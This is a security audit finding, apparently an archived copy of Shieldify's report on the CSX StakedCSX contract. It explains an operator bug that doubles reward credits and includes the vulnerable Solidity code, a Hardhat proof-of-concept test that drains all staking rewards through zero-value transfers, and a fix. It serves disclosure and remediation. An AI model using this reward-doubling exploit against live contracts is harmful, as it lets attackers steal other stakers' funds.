---
tags:
  - lang/solidity
  - sector/lending
  - sector/stable
  - sector/staking
  - sector/staking-pool
  - platform/shieldify
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/reward-theft
protocol: "[[Csx]]"
auditors:
  - "[[Shieldify Security]]"
report: "https://github.com/shieldify-security/audits-portfolio-md/blob/main/CSX-Security-Review.md"
genome:
  - "[[reward-calculation]]"
  - "[[reward-theft]]"
  - "[[reward-accounting]]"
---
# [C-01] Malicious Users Can Steal All Staking Rewards From `StakedCSX` Due to a Logical Error

- id: 44004
- impact: HIGH
- protocol: [[Csx]]
- reporter: Shieldify Security (Shieldify)
- source: https://github.com/shieldify-security/audits-portfolio-md/blob/main/CSX-Security-Review.md

## Summary


The report details a critical bug in the `_claimToCredit()` function of the `StakedCSX.sol` contract. This function has a logical error where the addition assignment operator is used instead of the plain assignment operator. This results in the credit values being doubled on each call, which can be exploited to drain all the staking rewards from the contract. The bug has been identified in the `StakedCSX.sol` file and the team has recommended replacing the addition assignment operators with plain assignment operators to fix the vulnerability. The team has since removed the `credit` mapping and made modifications to the `_updateRewardRate()` function to address the issue.

## Details

## Severity

Critical Risk

## Description

The current implementation of `_claimToCredit()` function in `StakedCSX.sol` contract has a logical error in it:

```solidity
(,,uint256 rewardWETH) = rewardOf(_to);
if (rewardWETH > 0) {
  credit[address(TOKEN_WETH)][_to] += rewardWETH;
}

(uint256 rewardUSDC,,) = rewardOf(_to);
if(rewardUSDC > 0) {
  credit[address(TOKEN_USDC)][_to] += rewardUSDC;
}

(,uint256 rewardUSDT,) = rewardOf(_to);
if(rewardUSDT > 0) {
  credit[address(TOKEN_USDT)][_to] += rewardUSDT;
}
```

As can be seen, an **addition assignment** operator is being used on all of the updates to the `credit` mapping. This is wrong since the current value of the respective credit for each asset is already being added to the reward variables that are retrieved through the `StakedCSX::rewardOf()` function. This means that on each call to `StakedCSX::_claimToCredit()`, the credit values are going to get **doubled**.

```solidity
if(credit[address(TOKEN_WETH)][_account] > 0) {
  wethAmount += credit[address(TOKEN_WETH)][_account];
}

if(credit[address(TOKEN_USDC)][_account] > 0) {
  usdcAmount += credit[address(TOKEN_USDC)][_account];
}

if(credit[address(TOKEN_USDT)][_account] > 0) {
  usdtAmount += credit[address(TOKEN_USDT)][_account];
}
```

And because `StakedCSX::_claimToCredit()` is being called in the `StakedCSX::_beforeTokenTransfer()` callback, this error can easily be abused to infinitely double the reward credits of a given user by simply making zero value `StakedCSX` token transfers.

## Impact

Malicious stakes can easily drain all of the staking rewards from the `StakedCSX.sol` contract, making the contract insolvent and leaving other stakes empty-handed.

## Proof of Concept

In the following test, it can be seen how a user who is entitled to only 1/8 of the staking rewards is able to claim **all** of them, using the above-described vulnerability:

```typescript
it("should double the reward of a given user on each token transfer", async () => {
  const amount1 = ethers.parseEther("500"); // 1/8 of underlying supply
  const amount2 = ethers.parseEther("3500"); // 7/8 of underlying supply
  const distributeAmount = ethers.parseUnits("500", 6);

  await CSXToken.connect(deployer).transfer(user1.getAddress(), amount1);
  await CSXToken.connect(deployer).transfer(user2.getAddress(), amount2);
  await CSXToken.connect(user1).approve(staking.target, amount1);
  await CSXToken.connect(user2).approve(staking.target, amount2);

  await staking.connect(user1).stake(amount1);
  await staking.connect(user2).stake(amount2);

  await USDCToken.connect(deployer).approve(staking.target, distributeAmount);
  await staking
    .connect(deployer)
    .depositDividend(USDCToken.target, distributeAmount);
  await staking.connect(keeperNode).distribute(true, true, true);

  // credit[USDC][user1] = 0 => rewardOf(user1) = 500
  const initialReward = await staking.rewardOf(user1.getAddress());
  await staking
    .connect(user1)
    .transfer("0x0000000000000000000000000000000000000001", BigInt(0));

  // credit[USDC][user1] = 500 => rewardOf(user1) = 500
  await staking
    .connect(user1)
    .transfer("0x0000000000000000000000000000000000000001", BigInt(0));

  // credit[USDC][user1] = 1000 => rewardOf(user1) = 1000
  await staking
    .connect(user1)
    .transfer("0x0000000000000000000000000000000000000001", BigInt(0));

  // credit[USDC][user1] = 2000 => rewardOf(user1) = 2000
  await staking
    .connect(user1)
    .transfer("0x0000000000000000000000000000000000000001", BigInt(0));

  // credit[USDC][user1] = 4000 => rewardOf(user1) = 4000
  const postTransferReward = await staking.rewardOf(user1.getAddress());

  console.log("> Initial reward: ", initialReward.usdcAmount);
  console.log("> Reward after 4 transfers: ", postTransferReward.usdcAmount);

  expect(postTransferReward.usdcAmount).to.equal(
    initialReward.usdcAmount * BigInt(8)
  );

  const usdcBalanceBefore = await USDCToken.balanceOf(staking.getAddress());
  await staking.connect(user1).claim(true, false, false, false);

  const usdcBalanceAfter = await USDCToken.balanceOf(staking.getAddress());

  console.log("> USDC balalance before claim: ", usdcBalanceBefore);
  console.log("> USDC balalance after claim: ", usdcBalanceAfter);

  expect(usdcBalanceAfter).to.equal(0);
});
```

To run the PoC test, add it to the `Staking` describe a block of the `StakedCSX.test.ts` file and then run `npx hardhat test --grep "should double the reward of a given user on each token transfer"` in the project root directory.

## Location of Affected Code

File: [StakedCSX.sol#L296](https://github.com/csx-protocol/csx-contracts/blob/4a066ae2229756518bfa3da1455c2ac646523a88/contracts/CSX/StakedCSX.sol#L296)

File: [StakedCSX.sol#L300](https://github.com/csx-protocol/csx-contracts/blob/4a066ae2229756518bfa3da1455c2ac646523a88/contracts/CSX/StakedCSX.sol#L300)

File: [StakedCSX.sol#L304](https://github.com/csx-protocol/csx-contracts/blob/4a066ae2229756518bfa3da1455c2ac646523a88/contracts/CSX/StakedCSX.sol#L304)

## Recommendation

To address this vulnerability, replace the addition assignment operators with plain assignment operators:

```diff
function _claimToCredit(address _to) private {
  if(balanceOf(_to) != 0) {
    (,,uint256 rewardWETH) = rewardOf(_to);
    if (rewardWETH > 0) {
-      credit[address(TOKEN_WETH)][_to] += rewardWETH;
+      credit[address(TOKEN_WETH)][_to] = rewardWETH;
    }
    (uint256 rewardUSDC,,) = rewardOf(_to);
    if(rewardUSDC > 0) {
-      credit[address(TOKEN_USDC)][_to] += rewardUSDC;
+      credit[address(TOKEN_USDC)][_to] = rewardUSDC;
    }
    (,uint256 rewardUSDT,) = rewardOf(_to);
    if(rewardUSDT > 0) {
-      credit[address(TOKEN_USDT)][_to] += rewardUSDT;
+      credit[address(TOKEN_USDT)][_to] = rewardUSDT;
    }
  }
  _updateRewardRate(_to, address(TOKEN_WETH));
  _updateRewardRate(_to, address(TOKEN_USDC));
  _updateRewardRate(_to, address(TOKEN_USDT));
}
```

## Team Response

Fixed by removing the `credit` mapping altogether and modifying the `_updateRewardRate()` function.
